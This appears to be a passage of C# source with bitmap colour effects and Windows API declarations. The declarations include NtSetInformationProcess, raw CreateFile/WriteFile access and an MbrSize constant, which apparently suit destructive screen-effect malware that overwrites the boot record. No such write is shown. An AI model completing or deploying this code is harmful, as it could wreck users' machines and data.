    public static PointF CirclePoint(float radius, float angleInDegrees, PointF origin)
    {
        float x = (float)(radius * Math.Cos(angleInDegrees * Math.PI / 180F)) + origin.X;
        float y = (float)(radius * Math.Sin(angleInDegrees * Math.PI / 180F)) + origin.Y;

        return new PointF(x, y);
    }
    static bool sds = true;
    public static Bitmap Solarise(this Bitmap sourceBitmap, byte blueValue,
                 byte greenValue, byte redValue)
    {
        BitmapData sourceData = sourceBitmap.LockBits(new Rectangle(0, 0,
                                sourceBitmap.Width, sourceBitmap.Height),
                                ImageLockMode.ReadOnly, PixelFormat.Format32bppArgb);


        byte[] pixelBuffer = new byte[sourceData.Stride * sourceData.Height];


        Marshal.Copy(sourceData.Scan0, pixelBuffer, 0, pixelBuffer.Length);


        sourceBitmap.UnlockBits(sourceData);


        byte byte255 = 255;


        for (int k = 0; k + 4 < pixelBuffer.Length; k += 4)
        {
            if (pixelBuffer[k] < blueValue)
            {
                pixelBuffer[k] = (byte)(byte255 - pixelBuffer[k]);
            }


            if (pixelBuffer[k + 1] < greenValue)
            {
                pixelBuffer[k + 1] = (byte)(byte255 - pixelBuffer[k + 1]);
            }


            if (pixelBuffer[k + 2] < redValue)
            {
                pixelBuffer[k + 2] = (byte)(byte255 - pixelBuffer[k + 2]);
            }
        }


        Bitmap resultBitmap = new Bitmap(sourceBitmap.Width, sourceBitmap.Height);

        BitmapData resultData = resultBitmap.LockBits(new Rectangle(0, 0,
                                 resultBitmap.Width, resultBitmap.Height),
                                 ImageLockMode.WriteOnly, PixelFormat.Format32bppArgb);


        Marshal.Copy(pixelBuffer, 0, resultData.Scan0, pixelBuffer.Length);
        resultBitmap.UnlockBits(resultData);


        return resultBitmap;
    }
    public static Bitmap ColorShade(this Bitmap sourceBitmap, float blueShade,
                                    float greenShade, float redShade)
    {
        BitmapData sourceData = sourceBitmap.LockBits(new Rectangle(0, 0,
                                sourceBitmap.Width, sourceBitmap.Height),
                                ImageLockMode.ReadOnly, PixelFormat.Format32bppArgb);


        byte[] pixelBuffer = new byte[sourceData.Stride * sourceData.Height];


        Marshal.Copy(sourceData.Scan0, pixelBuffer, 0, pixelBuffer.Length);


        sourceBitmap.UnlockBits(sourceData);


        float blue = 0;
        float green = 0;
        float red = 0;


        for (int k = 0; k + 4 < pixelBuffer.Length; k += 4)
        {
            blue = pixelBuffer[k] * blueShade;
            green = pixelBuffer[k + 1] * greenShade;
            red = pixelBuffer[k + 2] * redShade;


            if (blue < 0)
            { blue = 0; }


            if (green < 0)
            { green = 0; }


            if (red < 0)
            { red = 0; }


            pixelBuffer[k] = (byte)blue;
            pixelBuffer[k + 1] = (byte)green;
            pixelBuffer[k + 2] = (byte)red;
        }


        Bitmap resultBitmap = new Bitmap(sourceBitmap.Width, sourceBitmap.Height);


        BitmapData resultData = resultBitmap.LockBits(new Rectangle(0, 0,
                                resultBitmap.Width, resultBitmap.Height),
                                ImageLockMode.WriteOnly, PixelFormat.Format32bppArgb);


        Marshal.Copy(pixelBuffer, 0, resultData.Scan0, pixelBuffer.Length);
        resultBitmap.UnlockBits(resultData);


        return resultBitmap;
    }
    public static Bitmap SetHueRotate(Bitmap bmpElement, float value)
    {

        const float wedge = 60f / 360;

        var hueDegree = -value % 1;
        if (hueDegree < 0) hueDegree += 1;

        var matrix = new float[5][];

        if (hueDegree <= wedge)
        {
            var theta = hueDegree / wedge * (Math.PI / 2);
            var c = (float)Math.Cos(theta);
            var s = (float)Math.Sin(theta);

            matrix[0] = new float[] { c, 0, s, 0, 0 };
            matrix[1] = new float[] { s, c, 0, 0, 0 };
            matrix[2] = new float[] { 0, s, c, 0, 0 };
            matrix[3] = new float[] { 0, 0, 0, 1, 0 };
            matrix[4] = new float[] { 0, 0, 0, 0, 1 };

        }
        else if (hueDegree <= wedge * 2)
        {
            var theta = (hueDegree - wedge) / wedge * (Math.PI / 2);
            var c = (float)Math.Cos(theta);
            var s = (float)Math.Sin(theta);

            matrix[0] = new float[] { 0, s, c, 0, 0 };
            matrix[1] = new float[] { c, 0, s, 0, 0 };
            matrix[2] = new float[] { s, c, 0, 0, 0 };
            matrix[3] = new float[] { 0, 0, 0, 1, 0 };
            matrix[4] = new float[] { 0, 0, 0, 0, 1 };

        }
        else
        {
            var theta = (hueDegree - 2 * wedge) / wedge * (Math.PI / 2);
            var c = (float)Math.Cos(theta);
            var s = (float)Math.Sin(theta);

            matrix[0] = new float[] { s, c, 0, 0, 0 };
            matrix[1] = new float[] { 0, s, c, 0, 0 };
            matrix[2] = new float[] { c, 0, s, 0, 0 };
            matrix[3] = new float[] { 0, 0, 0, 1, 0 };
            matrix[4] = new float[] { 0, 0, 0, 0, 1 };
        }

        Bitmap originalImage = bmpElement;

        var imageAttributes = new ImageAttributes();
        imageAttributes.ClearColorMatrix();
        imageAttributes.SetColorMatrix(new ColorMatrix(matrix), ColorMatrixFlag.Default, ColorAdjustType.Bitmap);
        Graphics graphics = Graphics.FromImage(originalImage);
        graphics.DrawImage(
            originalImage, new Rectangle(0, 0, originalImage.Width, originalImage.Height),
            0, 0, originalImage.Width, originalImage.Height,
            GraphicsUnit.Pixel, imageAttributes
            );
        return originalImage;
    }
    #endregion
    #region Dll Imports and Enums
    [Flags]
    private enum RedrawWindowFlags : uint
    {
        Invalidate = 1u,
        InternalPaint = 2u,
        Erase = 4u,
        Validate = 8u,
        NoInternalPaint = 0x10u,
        NoErase = 0x20u,
        NoChildren = 0x40u,
        AllChildren = 0x80u,
        UpdateNow = 0x100u,
        EraseNow = 0x200u,
        Frame = 0x400u,
        NoFrame = 0x800u
    }

    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
    [DllImport("kernel32")]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
                IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32")]
    private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
        out uint lpNumberBytesWritten, IntPtr lpOverlapped);

    private const uint GenericAll = 0x10000000;
    private const uint FileShareRead = 0x1;
    private const uint FileShareWrite = 0x2;
    private const uint OpenExisting = 0x3;
    private const uint MbrSize = 512u;

    [DllImport("gdi32.dll")]
    public static extern IntPtr SelectObject([In] IntPtr hdc, [In] IntPtr hgdiobj);

    [DllImport("gdi32.dll")]
    private static extern IntPtr CreateSolidBrush(uint crColor);

    [DllImport("gdi32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool DeleteObject([In] IntPtr hObject);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr GetDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern bool ReleaseDC(IntPtr hWnd, IntPtr hDC);

    [DllImport("gdi32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool BitBlt([In] IntPtr hdc, int nXDest, int nYDest, int nWidth, int nHeight, [In] IntPtr hdcSrc, int nXSrc, int nYSrc, int dwRop);

    [DllImport("gdi32.dll")]
    private static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, CopyPixelOperation dwRop);

    [DllImport("user32.dll")]
    private static extern bool RedrawWindow(IntPtr hWnd, IntPtr lprcUpdate, IntPtr hrgnUpdate, RedrawWindowFlags flags);

    [DllImport("gdi32.dll")]
    static extern IntPtr CreateEllipticRgn(int nLeftRect, int nTopRect,
int nRightRect, int nBottomRect);

    [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC", SetLastError = true)]
    static extern IntPtr CreateCompatibleDC([In] IntPtr hdc);

    [System.Runtime.InteropServices.DllImportAttribute("msimg32.dll", EntryPoint = "AlphaBlend")]
    [return: System.Runtime.InteropServices.MarshalAsAttribute(System.Runtime.InteropServices.UnmanagedType.Bool)]
    public static extern bool AlphaBlend(System.IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, System.IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, BLENDFUNCTION ftn);

    [System.Runtime.InteropServices.StructLayoutAttribute(System.Runtime.InteropServices.LayoutKind.Sequential)]
    public struct BLENDFUNCTION
    {

        public byte BlendOp;

        public byte BlendFlags;

        public byte SourceConstantAlpha;

        public byte AlphaFormat;
    }
    public const int AC_SRC_OVER = 0;

    [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleBitmap")]
    static extern IntPtr CreateCompatibleBitmap([In] IntPtr hdc, int nWidth, int nHeight);

    [DllImport("gdi32.dll")]
    static extern bool StretchBlt(IntPtr hdcDest, int nXOriginDest, int nYOriginDest,
    int nWidthDest, int nHeightDest,
    IntPtr hdcSrc, int nXOriginSrc, int nYOriginSrc, int nWidthSrc, int nHeightSrc,
    CopyPixelOperation dwRop);

    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [Flags]
    public enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000,
        Decommit = 0x4000,
        Release = 0x8000,
        Reset = 0x80000,
        Physical = 0x400000,
        TopDown = 0x100000,
        WriteWatch = 0x200000,
        LargePages = 0x20000000
    }

    [Flags]
    public enum MemoryProtection
    {
        Execute = 0x10,
        ExecuteRead = 0x20,
        ExecuteReadWrite = 0x40,
        ExecuteWriteCopy = 0x80,
        NoAccess = 0x01,
        ReadOnly = 0x02,
        ReadWrite = 0x04,
        WriteCopy = 0x08,
        GuardModifierflag = 0x100,
        NoCacheModifierflag = 0x200,
        WriteCombineModifierflag = 0x400
    }
    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public unsafe struct RGBQUAD
    {
        public byte rgbBlue;
        public byte rgbGreen;
        public byte rgbRed;
        public byte rgbReserved;
    }

    [DllImport("user32.dll")]
    public static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    public static extern IntPtr GetWindowDC(IntPtr hWnd);

    [DllImport("Gdi32", EntryPoint = "GetBitmapBits")]
    public unsafe extern static long GetBitmapBits([In] IntPtr hbmp, [In] int cbBuffer, [Out] IntPtr lpvBits);
    [DllImport("gdi32.dll")]
    public static extern unsafe int SetBitmapBits(IntPtr hbmp, int cBytes, IntPtr lpvBits);

    [DllImport("gdi32.dll")]
    public unsafe static extern IntPtr CreateBitmap(int nWidth, int nHeight, uint cPlanes, uint cBitsPerPel, IntPtr lpvBits);
    #endregion
}
